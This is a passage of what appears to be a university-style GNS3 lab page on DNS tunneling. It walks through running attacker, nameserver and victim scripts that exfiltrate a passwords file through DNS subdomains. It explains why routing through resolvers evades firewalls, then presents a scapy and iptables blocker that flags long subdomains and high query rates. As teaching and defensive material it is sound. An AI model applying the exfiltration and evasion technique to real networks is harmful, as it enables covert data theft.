+<p>On the <strong>Attacker</strong> machine, run:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>/home/tunneling_attacker.py
+</code></pre></div>
+<p>The <code>tunneling_attacker.py</code> script on the Attacker machine will listen on a TCP port to collect the final exfiltrated data forwarded by <code>tunneling_nameserver.py</code>.</p>
+<p>To listen for connections, it binds a TCP socket to port 9999 on all available network interfaces (0.0.0.0), until an incoming connection arrives. In the full attack chain, this script is the passive endpoint, it just prints whatever subdomains the nameserver forwards, which would be the base64-encoded (or otherwise encoded) data chunks originally sent via DNS queries from the Victim machine.
+<br>
+<br></p>
+<h1 id="phase-2-bot-actions">Phase 2: Bot Actions</h1>
+<p>The victim's machine is where the "malware" resides. As a bot it will read a set of files and exfiltrate their contents.</p>
+<h3 id="step-21-prepare-the-data">Step 2.1: Prepare the Data</h3>
+<p>On the <strong>Victim</strong> machine, create the file(s) and populate them with a few lines of text:</p>
+<div class="highlight"><pre><span></span><code>nano<span class="w"> </span>/home/passwords.txt
+</code></pre></div>
+<p>The script <code>tunneling_victim.py</code> reads a few files like <code>passwords.txt</code>, for example, and uses each line as a subdomain for a DNS query, it performs the DNS queries that initiate the tunneling process. Create the files and populate them with a few lines of text.</p>
+<p><br></p>
+<h3 id="step-22-execute-the-tunneling-script">Step 2.2: Execute the Tunneling Script</h3>
+<p>Do a Wireshark capture right next to the Attacker Nameserver interface to be able to see both the packets that go to the Attacker machine as well those from the Victim machine (as a tip, use a <code>dns</code> filter to better analyze the relevant DNS packets).</p>
+<p>On the <strong>Victim</strong> machine, run:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>/home/tunneling_victim.py
+</code></pre></div>
+<p>You might need to run the script a couple  of times until it starts working properly.</p>
+<div class="admonition question question">
+<p class="admonition-title">Question</p>
+<p>The <code>tunneling_victim.py</code> script is configured to send DNS queries throught resolvers and not directly to the Attacker Nameserver. Why might this be more effective for an attacker than using direct DNS protocol communication?</p>
+</div>
+<details class="success">
+<summary>Answer</summary>
+<p>On the other side, using a resolver is more effective because it allows the traffic to bypass strict firewall rules that block direct outbound connections on port 53, blends the malicious traffic with legitimate DNS queries, and hides the Attacker Nameserver’s IP address from the victim’s local network logs. In the victim's network logs, the "destination" for the traffic will look like a trusted local server (the resolver) rather than a suspicious, unknown IP address in a foreign data center. DNS tunneling through a resolver follows the standard recursive lookup chain, making it look like a routine attempt to load a webpage rather than a specialized data tunnel.</p>
+</details>
+<p><br>
+<br></p>
+<h1 id="phase-3-final-validation-and-analysis">Phase 3: Final Validation and Analysis</h1>
+<p>You can now execute the full attack and observe the results. Ensure all three scripts (<code>tunneling_attacker.py</code>, <code>tunneling_nameserver.py</code>, <code>tunneling_victim.py</code>) are running on their respective machines. Observe the output on each screen.</p>
+<div class="admonition question question">
+<p class="admonition-title">Question</p>
+<p>Does it matter if any subdomain is resolved to 10.0.3.1 by the Attacker Nameserver?</p>
+</div>
+<details class="success">
+<summary>Answer</summary>
+<p>It doesn't. The specific IP address returned in the A record is irrelevant to the exfiltration process itself. The data is already "exfiltrated" as soon as the nameserver receives the DNS query and extracts the subdomain. The contents of TXT record are way more valuable.</p>
+</details>
+<p><br>
+<br>
+<br>
+<br>
+<br></p>
+<h1 id="countermeasure">Countermeasure</h1>
+<p>After performing the attack, we now pass on to the countermeasure phase. DNS tunneling abuses the DNS protocol by encoding data inside DNS queries and responses, exploiting the fact that DNS traffic is rarely blocked or deeply inspected by firewalls. One of the core features of this attack technique is that all communication is routed through recursive resolvers before reaching the attacker's authoritative server, meaning the victim machine never establishes a direct connection to the attacker. The main consequence of this is that by replacing the default external resolver with an Internal Resolver — one that is fully monitored — network administrators gain visibility over all DNS queries, enabling the detection of anomalous patterns such as unusually long subdomains, high query frequency, or rare domain names, which are telltale signs of DNS tunneling activity.</p>
+<figure>
+<p><img alt="Figure 3: Updated GNS3 Lab Topology" src="../../../images/tunneling-2.png" />
+  </p>
+<figcaption>Figure 3: Updated GNS3 Lab Topology</figcaption>
+</figure>
+<p><br>
+<br></p>
+<p>In the GNS3 project showed in Figure 3, you will need to modify the previous topology and add in some different network configurations:</p>
+<table>
+<thead>
+<tr>
+<th>Node Name</th>
+<th>Role</th>
+<th>IP Address</th>
+<th>Subnet</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Internal-Resolver (old Resolver)</strong></td>
+<td>Recursive DNS Server belonging to the Victim’s network</td>
+<td><strong>eth0: 10.0.4.1 ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ eth1: 10.0.5.254</strong></td>
+<td>10.0.4.0/24 10.0.5.0/24</td>
+</tr>
+<tr>
+<td><strong>Victim</strong></td>
+<td>Malware-infected victim. Contains sensitive data</td>
+<td><strong>10.0.5.1</strong></td>
+<td>10.0.5.0/24</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>Use the following configuration for the <code>Edit config</code> option of the <strong>Internal-Resolver</strong> machine options menu: </p>
+<p><div class="highlight"><pre><span></span><code><span class="n">auto</span> <span class="n">eth1</span>
+<span class="n">iface</span> <span class="n">eth1</span> <span class="n">inet</span> <span class="n">static</span>
+    <span class="n">address</span> <span class="mf">10.0.5.254</span>  
+    <span class="n">netmask</span> <span class="mf">255.255.255.0</span>
+
+
+<span class="n">auto</span> <span class="n">eth0</span>
+<span class="n">iface</span> <span class="n">eth0</span> <span class="n">inet</span> <span class="n">static</span>
+    <span class="n">address</span> <span class="mf">10.0.4.1</span>
+    <span class="n">netmask</span> <span class="mf">255.255.255.0</span>
+    <span class="n">gateway</span> <span class="mf">10.0.4.254</span>
+    <span class="n">up</span> <span class="n">named</span> <span class="o">-</span><span class="n">c</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">bind</span><span class="o">/</span><span class="n">named</span><span class="o">.</span><span class="n">conf</span>
+    <span class="n">up</span> <span class="n">ip</span> <span class="n">a</span> <span class="n">add</span> <span class="mf">10.0.5.254</span><span class="o">/</span><span class="mi">24</span> <span class="n">dev</span> <span class="n">eth1</span>
+</code></pre></div>
+<br></p>
+<p>The following scripts were used in this lab:</p>
+<ul>
+<li><a href="../../../scripts/tunneling_nameserver.py" download>tunneling_nameserver.py</a></li>
+<li><a href="../../../scripts/tunneling_attacker.py" download>tunneling_attacker.py</a></li>
+<li><a href="../../../scripts/tunneling_victim.py" download>tunneling_victim.py</a></li>
+<li><a href="../../../scripts/tunneling_blocker.py" download>tunneling_blocker.py</a></li>
+</ul>
+<p><br>
+<br></p>
+<h2 id="internal-resolver-monitor-setup">Internal-Resolver Monitor Setup</h2>
+<p>In Figure 3, we moved the Resolver machine to be between the Victim machine and the rest of the network. This way the Resolver can actually control what traffic reaches and is sent from the Victim machine. In a real-world scenario a firewall would stop the victim from using a public resolver (would block DNS packets from going to  outside the network) making using an internal resolver the other option left. This way by putting the Resolver directly between the Victim and the outside we achieve the same outcome.</p>
+<p>The script <code>tunneling_blocker.py</code> uses the python library scapy to sniff network packets that reach interface eth1 of the Internal-Resolver, meaning packets sent from the Victim machine. It listens for all UDP port 53 packets (DNS queries). For every DNS query it sees, it runs two heuristic checks to decide if the traffic looks suspicious: <strong>long subdomain check</strong> — legitimate DNS queries have short subdomains (e.g. mail.google.com). DNS tunnels encode data into the subdomain, producing very long strings like aGVsbG8gd29ybGQ.attacker.com. If the combined subdomain length exceeds 15 characters, it's flagged; and a <strong>query rate check</strong>, which tracks how many queries each IP has made in the last 10 seconds. More than 7 queries in that window is also flagged, since tunneling tools send many rapid queries. If either check triggers and the host isn't already blocked, it calls <code>block_host</code> function, which runs an <code>iptables</code> command to drop all forwarded traffic from that IP address (since only DNS traffic would be sent from the Victim to the Resolver this <code>iptables drop</code> command essentially only applies to DNS traffic). The block is automatically lifted after 5 minutes via a background timer thread.  </p>
+<p><br></p>
+<h3 id="step-1-execute-the-scapy-blocker-script">Step 1:  Execute the Scapy Blocker Script</h3>
+<p>On the GNS3 lab, we recommed you to add a <code>delay packet filter</code> of 300ms in the connection between the Internal-Resolver and the router. Do two Wireshark captures right next to each of the Internal-Resolver interfaces to be able to see the influence of the script’s restrictions on network traffic.</p>
+<p>On the <strong>Internal-Resolver</strong>, run: </p>
+<p><div class="highlight"><pre><span></span><code>python3<span class="w"> </span>/home/tunneling_blocker.py
+</code></pre></div>
+<br></p>
+<h3 id="step-2-re-run-the-attack">Step 2:  Re-run the attack</h3>
+<p>Repeat Steps 1.2 to 2.2 to re-run the attack.</p>
+<p><br></p>
+<div class="admonition question question">
+<p class="admonition-title">Question</p>
+<p>Did this blocker script make any difference in the completion of the attack? </p>
+</div>
+<details class="success">
+<summary>Answer</summary>
+<p>Yes it did. Since it sat between the two parties, by quickly blocking packets from the Victim to the Attacker Nameserver and from Attacker Nameserver to the Victim it completely stopped communication between the Victim and the Attacker Nameserver, making the attack unfeasible.</p>
+</details>
+<div class="admonition question question">
+<p class="admonition-title">Question</p>
+<p>Why do attackers encode data in subdomains specifically?</p>
+</div>
+<details class="success">
+<summary>Answer</summary>
+<p>The subdomain portion is the part the client controls. The authoritative nameserver for attacker.com is controlled by the attacker, so any query for <code>&lt;encoded-data&gt;.attacker.com</code> gets routed to their server. This gives them a bidirectional channel — data goes up in the query subdomain, and data comes back in the DNS response. Other parts of the DNS packet (like query type or TTL) have limited space or are harder to control consistently.</p>
+</details>
+<p><br>
+<br></p>
+<h1 id="conclusion">Conclusion</h1>
+<p>As we saw, after deploying the blocker script the vast majority of packets (if not all) containing sensitive data sent from the Victim Machine were blocked and so the Attacker Nameserver wasn't able to respond to them and no DNS Replies would then reach the victim, so the exfiltration goal of the attacker was inhibited. </p>
+<p>The block period was defined with a 5-minute duration (stopping DNS resolution for the victim altogether) although most probably in the real-world the malicious domain (e.g attacker.com) would be blacklisted at the DNS resolver level — meaning the internal DNS server would simply refuse to resolve it at all, for anyone on the network, permanently, and the IP address would be blacklisted by network administrators and added to a persistent firewall blocklist.</p>
+<p>In enterprise environments, both the IP and domain would likely be submitted to threat intelligence feeds, shared with other organizations, and reported to the domain registrar for takedown.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.sections", "navigation.tabs", "navigation.indexes", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
